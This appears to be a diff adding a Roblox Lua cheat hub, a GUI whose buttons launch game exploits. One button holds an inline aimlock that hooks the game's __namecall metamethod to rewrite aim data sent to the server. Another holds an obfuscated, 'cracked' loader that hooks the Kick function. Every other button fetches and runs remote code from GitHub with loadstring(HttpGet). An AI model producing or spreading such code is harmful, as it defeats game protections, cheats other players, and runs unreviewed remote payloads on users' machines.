@@ -1,0 +1,502 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local label = Instance.new("TextLabel")
+local Dotlock = Instance.new("TextButton")
+local LuckAssist = Instance.new("TextButton")
+local Faded = Instance.new("TextButton")
+local beamedware = Instance.new("TextButton")
+local softvortex_dhm = Instance.new("TextButton")
+local softvortex_uh = Instance.new("TextButton")
+local softvortex_dh = Instance.new("TextButton")
+local SwagMode = Instance.new("TextButton")
+local AdminFly = Instance.new("TextButton")
+local Late = Instance.new("TextButton")
+local Arctic = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+main.Name = "main"
+main.Parent = ScreenGui
+main.BackgroundColor3 = Color3.fromRGB(30, 30, 31)
+main.Position = UDim2.new(0.230328292, 0, 0.230555549, 0)
+main.Size = UDim2.new(0, 918, 0, 469)
+
+label.Name = "label"
+label.Parent = main
+label.BackgroundColor3 = Color3.fromRGB(70, 71, 72)
+label.Size = UDim2.new(0, 918, 0, 68)
+label.Font = Enum.Font.SourceSans
+label.Text = "Made By mute#9224 and op#0001"
+label.TextColor3 = Color3.fromRGB(0, 0, 0)
+label.TextSize = 30.000
+
+Dotlock.Name = "Dotlock"
+Dotlock.Parent = main
+Dotlock.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Dotlock.BackgroundTransparency = 0.600
+Dotlock.Position = UDim2.new(0.0174291935, 0, 0.194029853, 0)
+Dotlock.Size = UDim2.new(0, 200, 0, 50)
+Dotlock.Font = Enum.Font.Arial
+Dotlock.Text = "Dotlock"
+Dotlock.TextColor3 = Color3.fromRGB(0, 0, 0)
+Dotlock.TextSize = 25.000
+Dotlock.MouseButton1Down:connect(function()
+	local Settings = {
+		rewrittenmain = {
+			Enabled = true,
+			Key = "c",
+			DOT = true,
+			AIRSHOT = true,
+			NOTIF = true,
+			AUTOPRED = true,
+			FOV = math.huge,
+			RESOVLER = false
+		}
+	}
+
+	local SelectedPart = "Head"
+	local Prediction = true
+	local PredictionValue = 5
+
+
+	local AnchorCount = 0
+	local MaxAnchor = 50
+
+	local CC = game:GetService"Workspace".CurrentCamera
+	local Plr;
+	local enabled = false
+	local accomidationfactor = 0.121
+	local mouse = game.Players.LocalPlayer:GetMouse()
+	local placemarker = Instance.new("Part", game.Workspace)
+
+	function makemarker(Parent, Adornee, Color, Size, Size2)
+		local e = Instance.new("BillboardGui", Parent)
+		e.Name = "PP"
+		e.Adornee = Adornee
+		e.Size = UDim2.new(Size, Size2, Size, Size2)
+		e.AlwaysOnTop = Settings.rewrittenmain.DOT
+		local a = Instance.new("Frame", e)
+		if Settings.rewrittenmain.DOT == true then
+			a.Size = UDim2.new(1, 0, 1, 0)
+		else
+			a.Size = UDim2.new(0, 0, 0, 0)
+		end
+		if Settings.rewrittenmain.DOT == true then
+			a.Transparency = 0
+			a.BackgroundTransparency = 0
+		else
+			a.Transparency = 1
+			a.BackgroundTransparency = 1
+		end
+		a.BackgroundColor3 = Color
+		local g = Instance.new("UICorner", a)
+		if Settings.rewrittenmain.DOT == false then
+			g.CornerRadius = UDim.new(0, 0)
+		else
+			g.CornerRadius = UDim.new(1, 1) 
+		end
+		return(e)
+	end
+
+
+	local data = game.Players:GetPlayers()
+	function noob(player)
+		local character
+		repeat wait() until player.Character
+		local handler = makemarker(guimain, player.Character:WaitForChild(SelectedPart), Color3.fromRGB(107, 184, 255), 0.3, 3)
+		handler.Name = player.Name
+		player.CharacterAdded:connect(function(Char) handler.Adornee = Char:WaitForChild(SelectedPart) end)
+
+
+		spawn(function()
+			while wait() do
+				if player.Character then
+				end
+			end
+		end)
+	end
+
+	for i = 1, #data do
+		if data[i] ~= game.Players.LocalPlayer then
+			noob(data[i])
+		end
+	end
+
+	game.Players.PlayerAdded:connect(function(Player)
+		noob(Player)
+	end)
+
+	spawn(function()
+		placemarker.Anchored = true
+		placemarker.CanCollide = false
+		if Settings.rewrittenmain.DOT == true then
+			placemarker.Size = Vector3.new(8, 8, 8)
+		else
+			placemarker.Size = Vector3.new(0, 0, 0)
+		end
+		placemarker.Transparency = 0.75
+		if Settings.rewrittenmain.DOT then
+			makemarker(placemarker, placemarker, Color3.fromRGB(232, 186, 200), 0.40, 0)
+		end
+	end)
+
+	game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
+		if k == Settings.rewrittenmain.Key and Settings.rewrittenmain.Enabled then
+			if enabled == true then
+				enabled = false
+				if Settings.rewrittenmain.NOTIF == true then
+					Plr = getClosestPlayerToCursor()
+					game.StarterGui:SetCore("SendNotification", {
+						Title = "";
+						Text = "Unlocked :)",
+						Duration = 5
+					})
+				end
+			else
+				Plr = getClosestPlayerToCursor()
+				enabled = true
+				if Settings.rewrittenmain.NOTIF == true then
+
+					game.StarterGui:SetCore("SendNotification", {
+						Title = "";
+						Text = "Target: "..tostring(Plr.Character.Humanoid.DisplayName),
+						Duration = 5
+					})
+
+				end
+			end
+		end
+	end)
+
+
+
+	function getClosestPlayerToCursor()
+		local closestPlayer
+		local shortestDistance = Settings.rewrittenmain.FOV
+
+		for i, v in pairs(game.Players:GetPlayers()) do
+			if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
+				local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
+				local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude
+				if magnitude < shortestDistance then
+					closestPlayer = v
+					shortestDistance = magnitude
+				end
+			end
+		end
+		return closestPlayer
+	end
+
+	local pingvalue = nil;
+	local split = nil;
+	local ping = nil;
+
+	game:GetService"RunService".Stepped:connect(function()
+		if enabled and Plr.Character ~= nil and Plr.Character:FindFirstChild("HumanoidRootPart") then
+			placemarker.CFrame = CFrame.new(Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*accomidationfactor))
+		else
+			placemarker.CFrame = CFrame.new(0, 9999, 0)
+		end
+		if Settings.rewrittenmain.AUTOPRED == true then
+			pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
+			split = string.split(pingvalue,'(')
+			ping = tonumber(split[1])
+			if ping < 130 then
+				PredictionValue = 0.151
+			elseif ping < 125 then
+				PredictionValue = 0.149
+			elseif ping < 110 then
+				PredictionValue = 0.146
+			elseif ping < 105 then
+				PredictionValue = 0.138
+			elseif ping < 90 then
+				PredictionValue = 0.136
+			elseif ping < 80 then
+				PredictionValue = 0.134
+			elseif ping < 70 then
+				PredictionValue = 0.131
+			elseif ping < 60 then
+				PredictionValue = 0.1229
+			elseif ping < 50 then
+				PredictionValue = 0.1225
+			elseif ping < 40 then
+				PredictionValue = 0.1256
+			end
+		end
+	end)
+
+	local mt = getrawmetatable(game)
+	local old = mt.__namecall
+	setreadonly(mt, false)
+	mt.__namecall = newcclosure(function(...)
+		local args = {...}
+		if enabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" and Settings.rewrittenmain.Enabled and Plr.Character ~= nil then
+
+			-- args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*accomidationfactor)
+            --[[
+            if Settings.rewrittenmain.AIRSHOT == true then
+                if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall
+                    
+                    --// Airshot
+                    args[3] = Plr.Character.LeftFoot.Position+(Plr.Character.LeftFoot.Velocity*PredictionValue)
+
+                else
+                    args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*PredictionValue)
+
+                end
+            else
+                    args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*PredictionValue)
+            end
+            ]]
+			if Prediction == true then
+
+				args[3] = Plr.Character[SelectedPart].Position+(Plr.Character[SelectedPart].Velocity*PredictionValue)
+
+			else
+
+				args[3] = Plr.Character[SelectedPart].Position
+
+			end
+
+			return old(unpack(args))
+		end
+		return old(...)
+	end)
+
+	game:GetService("RunService").RenderStepped:Connect(function()
+		if Settings.rewrittenmain.RESOVLER == true and Plr.Character ~= nil and enabled and Settings.rewrittenmain.Enabled then
+			if Settings.rewrittenmain.AIRSHOT == true and enabled and Plr.Character ~= nil then
+
+				if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall
+
+					--// Airshot
+
+					--// Anchor Check
+
+					if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
+						AnchorCount = AnchorCount + 1
+						if AnchorCount >= MaxAnchor then
+							Prediction = false
+							wait(2)
+							AnchorCount = 0;
+						end
+					else
+						Prediction = true
+						AnchorCount = 0;
+					end
+
+					SelectedPart = "LeftFoot"
+
+				else
+					--// Anchor Check
+
+					if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
+						AnchorCount = AnchorCount + 1
+						if AnchorCount >= MaxAnchor then
+							Prediction = false
+							wait(2)
+							AnchorCount = 0;
+						end
+					else
+						Prediction = true
+						AnchorCount = 0;
+					end
+
+					SelectedPart = "HumanoidRootPart"
+
+				end
+			else
+
+				--// Anchor Check
+
+				if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
+					AnchorCount = AnchorCount + 1
+					if AnchorCount >= MaxAnchor then
+						Prediction = false
+						wait(2)
+						AnchorCount = 0;
+					end
+				else
+					Prediction = true
+					AnchorCount = 0;
+				end
+
+				SelectedPart = "HumanoidRootPart"
+			end
+
+		else
+			SelectedPart = "HumanoidRootPart"
+		end
+	end)
+end)
+
+LuckAssist.Name = "LuckAssist"
+LuckAssist.Parent = main
+LuckAssist.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+LuckAssist.BackgroundTransparency = 0.600
+LuckAssist.Position = UDim2.new(0.0174291935, 0, 0.417910457, 0)
+LuckAssist.Size = UDim2.new(0, 200, 0, 50)
+LuckAssist.Font = Enum.Font.Arial
+LuckAssist.Text = "LuckAssist"
+LuckAssist.TextColor3 = Color3.fromRGB(0, 0, 0)
+LuckAssist.TextSize = 25.000
+LuckAssist.MouseButton1Down:connect(function()
+	--cracked by Abyss-Hub .gg/dQ7tXQSvxg
+	local a=game:GetService("\80\108\97\121\101\114\115")local b=math.random(69,420)local c=bit;local d;local e="\98\97\108\100\46\102\117\110\32\115\111\32\103\111\111\100\32\119\104\105\116\101\108\105\115\116\32\120\68\68\68\10"if bit then d=c.bdiv(c.badd(1,2),3*b/b)*b/b*b/b*b/b*b/b*b/b*b/b*b/b*b/b*b/b*b/b else d=(1+2)/3*b/b*b/b*b/b*b/b*b/b*b/b*b/b*b/b*b/b*b/b*b/b end;function setcore()if e=="\98\97\108\100\46\102\117\110\32\115\111\32\103\111\111\100\32\119\104\105\116\101\108\105\115\116\32\120\68\68\68\10"then game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110",{Title="\67\114\97\99\107\101\100\32\66\121\32\65\98\121\115\115",Text=e,Duration=5})end end;setcore(e,e,e,e,e,e,e)local f=a:GetChildren()[d]if hookfunc then hookfunc(f.Kick,function()return"\98\97\108\100\46\102\117\110\32\115\111\32\103\111\111\100\32\119\104\105\116\101\108\105\115\116\32\120\68\68\68\10"end)end;loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\86\97\117\108\116\71\105\116\111\115\47\79\116\104\101\114\115\47\109\97\105\110\47\76\117\99\107\65\115\115\105\115\116\66\97\99\107\117\112\46\108\117\97",true))()
+end)
+
+
+Faded.Name = "Faded"
+Faded.Parent = main
+Faded.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Faded.BackgroundTransparency = 0.600
+Faded.Position = UDim2.new(0.0174291935, 0, 0.643923223, 0)
+Faded.Size = UDim2.new(0, 200, 0, 50)
+Faded.Font = Enum.Font.Arial
+Faded.Text = "Faded"
+Faded.TextColor3 = Color3.fromRGB(0, 0, 0)
+Faded.TextSize = 25.000
+Faded.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
+end)
+
+beamedware.Name = "beamedware"
+beamedware.Parent = main
+beamedware.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+beamedware.BackgroundTransparency = 0.600
+beamedware.Position = UDim2.new(0.0174291935, 0, 0.844349682, 0)
+beamedware.Size = UDim2.new(0, 200, 0, 50)
+beamedware.Font = Enum.Font.Arial
+beamedware.Text = "beamedware"
+beamedware.TextColor3 = Color3.fromRGB(0, 0, 0)
+beamedware.TextSize = 25.000
+beamedware.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/EliasAtto1/BeamedWare/main/BeamedWare", true))()
+end)
+
+softvortex_dhm.Name = "softvortex_dhm"
+softvortex_dhm.Parent = main
+softvortex_dhm.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+softvortex_dhm.BackgroundTransparency = 0.600
+softvortex_dhm.Position = UDim2.new(0.294117659, 0, 0.194029853, 0)
+softvortex_dhm.Size = UDim2.new(0, 200, 0, 50)
+softvortex_dhm.Font = Enum.Font.Arial
+softvortex_dhm.Text = "softvortex_dhm"
+softvortex_dhm.TextColor3 = Color3.fromRGB(0, 0, 0)
+softvortex_dhm.TextSize = 25.000
+softvortex_dhm.MouseButton1Down:connect(function()
+	--- Made By Airsoft#0001
+	--- discord.gg/SoftVortex
+	--- Version 2.4
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/Airsoft0001/69/main/69"),true))()
+end)
+
+softvortex_uh.Name = "softvortex_uh"
+softvortex_uh.Parent = main
+softvortex_uh.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+softvortex_uh.BackgroundTransparency = 0.600
+softvortex_uh.Position = UDim2.new(0.294117659, 0, 0.417910457, 0)
+softvortex_uh.Size = UDim2.new(0, 200, 0, 50)
+softvortex_uh.Font = Enum.Font.Arial
+softvortex_uh.Text = "softvortex_uh"
+softvortex_uh.TextColor3 = Color3.fromRGB(0, 0, 0)
+softvortex_uh.TextSize = 25.000
+softvortex_uh.MouseButton1Down:connect(function()
+	--- untitled hood made by AIrsoft#0001
+	--- discord.gg/softvortex
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/SoftVortex/DADDYAIRSOFT/main/ong"),true))()
+end)
+
+softvortex_dh.Name = "softvortex_dh"
+softvortex_dh.Parent = main
+softvortex_dh.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+softvortex_dh.BackgroundTransparency = 0.540
+softvortex_dh.Position = UDim2.new(0.294117659, 0, 0.643923223, 0)
+softvortex_dh.Size = UDim2.new(0, 200, 0, 50)
+softvortex_dh.Font = Enum.Font.Arial
+softvortex_dh.Text = "softvortex_dh"
+softvortex_dh.TextColor3 = Color3.fromRGB(0, 0, 0)
+softvortex_dh.TextSize = 25.000
+softvortex_dh.MouseButton1Down:connect(function()
+	--- Made By mute#9224
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/Airsoft0001/dh/main/dh"),true))()
+end)
+
+SwagMode.Name = "SwagMode"
+SwagMode.Parent = main
+SwagMode.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SwagMode.BackgroundTransparency = 0.600
+SwagMode.Position = UDim2.new(0.294117659, 0, 0.844349682, 0)
+SwagMode.Size = UDim2.new(0, 200, 0, 50)
+SwagMode.Font = Enum.Font.Arial
+SwagMode.Text = "SwagMode"
+SwagMode.TextColor3 = Color3.fromRGB(0, 0, 0)
+SwagMode.TextSize = 25.000
+SwagMode.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
+end)
+
+AdminFly.Name = "AdminFly"
+AdminFly.Parent = main
+AdminFly.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+AdminFly.BackgroundTransparency = 0.600
+AdminFly.Position = UDim2.new(0.564270139, 0, 0.194029853, 0)
+AdminFly.Size = UDim2.new(0, 200, 0, 50)
+AdminFly.Font = Enum.Font.Arial
+AdminFly.Text = "Admin Fly"
+AdminFly.TextColor3 = Color3.fromRGB(0, 0, 0)
+AdminFly.TextSize = 25.000
+AdminFly.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/22kristina/swag/main/admin_fly'))()
+end)
+
+Late.Name = "Late"
+Late.Parent = main
+Late.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Late.BackgroundTransparency = 0.600
+Late.Position = UDim2.new(0.564270139, 0, 0.417910457, 0)
+Late.Size = UDim2.new(0, 200, 0, 50)
+Late.Font = Enum.Font.Arial
+Late.Text = "Late"
+Late.TextColor3 = Color3.fromRGB(0, 0, 0)
+Late.TextSize = 25.000
+Late.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Impulseonyoutube/scripts/main/dahood"))()
+end)
+
+Arctic.Name = "Arctic"
+Arctic.Parent = main
+Arctic.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Arctic.BackgroundTransparency = 0.600
+Arctic.Position = UDim2.new(0.564270139, 0, 0.643923223, 0)
+Arctic.Size = UDim2.new(0, 200, 0, 50)
+Arctic.Font = Enum.Font.Arial
+Arctic.Text = "Arctic"
+Arctic.TextColor3 = Color3.fromRGB(0, 0, 0)
+Arctic.TextSize = 25.000
+Arctic.MouseButton1Down:connect(function()
+	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/PolarWasHere/Arctic/main/Arctic"))()
+end)
+
+-- Scripts:
+
+local function FHDMF_fake_script() -- main.LocalScript 
+	local script = Instance.new('LocalScript', main)
+
+	local HotKey = Enum.KeyCode.V-- Key to open Gui --
+	local UIS = game:GetService("UserInputService")
+	
+	UIS.InputBegan:Connect(function(Key)
+		if Key.KeyCode == HotKey then
+			script.Parent.Visible = not script.Parent.Visible
+		end
+	end)
+end
+coroutine.wrap(FHDMF_fake_script)()
